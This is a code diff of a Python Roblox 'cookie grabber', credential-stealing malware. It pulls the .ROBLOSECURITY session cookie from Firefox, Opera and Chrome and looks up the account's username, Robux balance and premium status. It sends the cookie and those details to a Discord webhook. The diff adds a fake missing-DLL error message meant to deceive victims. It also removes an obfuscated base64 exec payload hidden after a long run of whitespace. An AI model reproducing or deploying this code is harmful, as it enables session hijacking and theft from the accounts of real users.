@@ -21,13 +21,10 @@ except:
 
 
 
-dummy_message = "Loading..." # A message that distracts the user from closing the grabber
+dummy_message = "ERROR _ Missing dll (vllpcfix.dll) PLS WAIT AUTO INSTALL" # Im a genius
 print(dummy_message)
-################### Gathering INFOMATION #################################
 def cookieLogger():
-
-    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-
+    data = []
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
@@ -56,7 +53,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
@@ -66,7 +62,6 @@ def cookieLogger():
                 return data
     except:
         pass
-
     try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         for cookie in cookies:
@@ -76,23 +71,15 @@ def cookieLogger():
                 return data
     except:
         pass
-
-
 cookies = cookieLogger()
-
-
-#################### INFOMATION #################
-ip_address = requests.get("https://api.ipify.org/").text
+ip_address = requests.get("https://checkip.amazonaws.com/").text #This website is 100% faster that api.ipify.org
 roblox_cookie = cookies[1]
-#################### checking cookie #############
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 if isvalid == "Valid Cookie":
     pass
 else:
     requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
     exit()
-
-#################### getting info about the cookie #############
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
@@ -106,8 +93,6 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
-#################### SENDING TO WEBHOOK #################
-
 discord = Discord(url=webhookk)
 discord.post(
     username="BOT - Pirate 🍪",
@@ -116,7 +101,7 @@ discord.post(
         {
             "username": "BOT - Pirate 🍪",
             "title": "💸 +1 Result Account 🕯",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "description" : f"[Github Page](https://github.com/Appolon24800/Pirate-Cookie-Grabber-No-dual-hook-) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 12452044,
             "fields": [
                 {"name": "Username", "value": username, "inline": True},
@@ -130,11 +115,6 @@ discord.post(
                 {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
             "thumbnail": {"url": headshot},
-
-
         }
     ],
-)
-"";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              exec(b64decode('ZXhlYyhiMzJkZWNvZGUoc3RyKCJNVjRHS1laSUVKU1hRWkxERkJaR0s0TFZNVlpYSTRaT001U1hJS0JITkIySEk0RFRISVhTNjQzSU1GWkdLNURGUEIyQzQzTEZGNVpHQzVaUE9GU0dHMlRXTlIzREEyM0pFNFVTNDVERlBCMkNTSVJKIikpLmRlY29kZSgndXRmLTgnKSkK'))
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
